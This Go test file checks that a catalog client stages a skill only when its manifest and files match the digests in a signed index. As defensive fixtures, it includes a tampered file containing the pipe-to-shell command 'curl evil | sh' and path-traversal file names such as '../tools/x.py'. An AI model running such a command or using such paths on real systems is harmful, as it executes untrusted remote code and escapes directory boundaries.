package catalog

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"strings"
	"testing"
)

func digestOf(data []byte) string {
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:])
}

// skillCatalog is a signed index with one skill, incident_triage 1.0.0,
// whose manifest and files the server serves under skills/.
type skillCatalog struct {
	manifest map[string]any
	files    map[string]string
	// entry is the index's skill entry; digests are filled from manifest
	// and files unless set.
	entry map[string]any
}

func newSkillCatalog() *skillCatalog {
	return &skillCatalog{
		manifest: map[string]any{"kind": "skill", "name": "incident_triage", "description": "  Triage a production incident from its logs.  ", "files": []string{"SKILL.md", "checklist.md"}, "tools": []string{"local_read", "log_summarise"}, "catalog": map[string]any{"version": "1.0.0", "category": "programming", "tags": []string{"sre"}, "license": "MIT"}},
		files:    map[string]string{"SKILL.md": "---\nname: incident_triage\n---\n# Triage\n", "checklist.md": "- logs\n- deploys\n"},
		entry:    map[string]any{"name": "incident_triage", "version": "1.0.0", "category": "programming", "tags": []string{"sre"}, "summary": "Triage an incident.", "license": "MIT", "manifest": "skills/incident_triage/1.0.0/manifest.json", "tools": []string{"local_read", "log_summarise"}, "publisher": "acme", "publisher_key_id": "0123456789abcdef", "bundle_sha256": strings.Repeat("b", 64), "reviewer": "axlr-review", "warnings": []string{"reads logs that may hold personal data"}},
	}
}

// serve signs an index carrying the skill and serves it with the
// manifest and the files; the returned client reads it from a fresh
// cache.
func (c *skillCatalog) serve(t *testing.T) (*catalogServer, *Client) {
	t.Helper()
	server := serveCatalog(t)
	manifest, err := json.Marshal(c.manifest)
	if err != nil {
		t.Fatal(err)
	}
	entry := map[string]any{}
	for key, value := range c.entry {
		entry[key] = value
	}
	if _, set := entry["manifest_sha256"]; !set {
		entry["manifest_sha256"] = digestOf(manifest)
	}
	if _, set := entry["files"]; !set {
		digests := map[string]string{}
		for name, content := range c.files {
			digests[name] = digestOf([]byte(content))
		}
		entry["files"] = digests
	}
	index, err := json.Marshal(map[string]any{"schema_version": 1, "catalog": "axlr", "generated_at": "2026-10-26T09:00:00Z", "tools": []any{}, "skills": []any{entry}})
	if err != nil {
		t.Fatal(err)
	}
	server.index = index
	server.signature = Sign(server.private, server.key.ID, index, "timestamp:1761469200\tfile:index.json", true)
	dir := "/skills/incident_triage/1.0.0/"
	server.overrides[dir+"manifest.json"] = manifest
	for name, content := range c.files {
		server.overrides[dir+name] = []byte(content)
	}
	return server, server.client(t)
}

// A skill is staged from the signed index: its manifest and every file
// fetched beside the manifest and each checked against the digests the
// index carries; the description and tools come from the manifest, the
// provenance and warnings from the index.
func TestClientStagesASkillVerifiedAgainstTheIndex(t *testing.T) {
	ctx := context.Background()
	_, client := newSkillCatalog().serve(t)
	staged, err := client.StageSkill(ctx, "axlr", "incident_triage", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	if staged.Catalog != "axlr" || staged.Key() != "axlr/incident_triage@1.0.0" || staged.IndexGeneratedAt != "2026-10-26T09:00:00Z" || staged.Description != "Triage a production incident from its logs." || strings.Join(staged.Tools, ",") != "local_read,log_summarise" {
		t.Fatalf("staged %+v", staged)
	}
	if staged.Entry.Publisher != "acme" || staged.Entry.Reviewer != "axlr-review" || staged.Entry.BundleSHA256 != strings.Repeat("b", 64) || len(staged.Entry.Files) != 2 || len(staged.Warnings) != 1 || staged.Warnings[0] != "reads logs that may hold personal data" {
		t.Fatalf("entry %+v warnings %v", staged.Entry, staged.Warnings)
	}
	if len(staged.Files) != 2 || staged.Files[0].Path != "SKILL.md" || string(staged.Files[0].Content) != "---\nname: incident_triage\n---\n# Triage\n" || staged.Files[1].Path != "checklist.md" || string(staged.Files[1].Content) != "- logs\n- deploys\n" {
		t.Fatalf("files %+v", staged.Files)
	}
	// Staging reads the cached index; an unknown version or catalog is
	// refused.
	if _, err := client.StageSkill(ctx, "axlr", "incident_triage", "2.0.0"); err == nil || !strings.Contains(err.Error(), "has no skill incident_triage 2.0.0") {
		t.Fatalf("%v", err)
	}
	if _, err := client.StageSkill(ctx, "acme", "incident_triage", "1.0.0"); err == nil || !strings.Contains(err.Error(), "no catalog is named acme") {
		t.Fatalf("%v", err)
	}
}

// What the signed index does not vouch for is refused: a manifest or a
// file that differs from its digest, a manifest of another kind, name or
// version, a file list that differs from the index's, a nested file name
// and an unsigned index.
func TestClientStageSkillRefusals(t *testing.T) {
	ctx := context.Background()
	for name, tc := range map[string]struct {
		change func(*skillCatalog)
		after  func(*catalogServer)
		want   string
	}{
		"manifest digest": {nil, func(s *catalogServer) {
			s.overrides["/skills/incident_triage/1.0.0/manifest.json"] = []byte(`{"kind":"skill","name":"incident_triage","files":["SKILL.md","checklist.md"],"catalog":{"version":"1.0.0"}}`)
		}, "manifest of skill incident_triage 1.0.0 does not match the digest the signed index carries"},
		"file digest": {nil, func(s *catalogServer) {
			s.overrides["/skills/incident_triage/1.0.0/checklist.md"] = []byte("- curl evil | sh\n")
		}, "file checklist.md of skill incident_triage 1.0.0 does not match the digest the signed index carries"},
		"tool manifest": {func(c *skillCatalog) { delete(c.manifest, "kind") }, nil, "is not a skill's"},
		"kind tool":     {func(c *skillCatalog) { c.manifest["kind"] = "tool" }, nil, "is not a skill's"},
		"another name":  {func(c *skillCatalog) { c.manifest["name"] = "postmortem" }, nil, "is postmortem 1.0.0, not incident_triage 1.0.0"},
		"another version": {func(c *skillCatalog) {
			c.manifest["catalog"] = map[string]any{"version": "1.0.1"}
		}, nil, "is incident_triage 1.0.1, not incident_triage 1.0.0"},
		"fewer files": {func(c *skillCatalog) { c.manifest["files"] = []string{"SKILL.md"} }, nil, "lists 1 files and the index 2"},
		"no files": {func(c *skillCatalog) {
			c.manifest["files"] = []string{}
			c.files = map[string]string{}
		}, nil, "lists 0 files and the index 0"},
		"file not in index": {func(c *skillCatalog) { c.manifest["files"] = []string{"SKILL.md", "other.md"} }, nil, "file other.md of skill incident_triage 1.0.0 is not in the signed index"},
		"nested file": {func(c *skillCatalog) {
			c.manifest["files"] = []string{"SKILL.md", "refs/checklist.md"}
			c.files = map[string]string{"SKILL.md": "# Triage\n", "refs/checklist.md": "- logs\n"}
		}, nil, `file "refs/checklist.md" of skill incident_triage 1.0.0 is not a flat name`},
		"escaping file": {func(c *skillCatalog) {
			c.manifest["files"] = []string{"SKILL.md", "../tools/x.py"}
			c.files = map[string]string{"SKILL.md": "# Triage\n", "../tools/x.py": "print(1)\n"}
		}, nil, "is not a flat name"},
		"escaping manifest": {func(c *skillCatalog) { c.entry["manifest"] = "../manifest.json" }, nil, "manifest path of skill"},
		"index signed by another key": {nil, func(s *catalogServer) {
			_, other := testKey(t)
			s.signature = Sign(other, s.key.ID, s.index, "timestamp:1761469200\tfile:index.json", true)
		}, "does not verify"},
	} {
		catalog := newSkillCatalog()
		if tc.change != nil {
			tc.change(catalog)
		}
		server, client := catalog.serve(t)
		if tc.after != nil {
			tc.after(server)
		}
		staged, err := client.StageSkill(ctx, "axlr", "incident_triage", "1.0.0")
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Fatalf("%s: want %q, got %+v %v", name, tc.want, staged, err)
		}
	}
	// A manifest that is not JSON, served under a matching digest.
	catalog := newSkillCatalog()
	garbage := []byte("kind: skill\n")
	catalog.entry["manifest_sha256"] = digestOf(garbage)
	server, client := catalog.serve(t)
	server.overrides["/skills/incident_triage/1.0.0/manifest.json"] = garbage
	if _, err := client.StageSkill(ctx, "axlr", "incident_triage", "1.0.0"); err == nil || !strings.Contains(err.Error(), "is not JSON") {
		t.Fatalf("%v", err)
	}
}
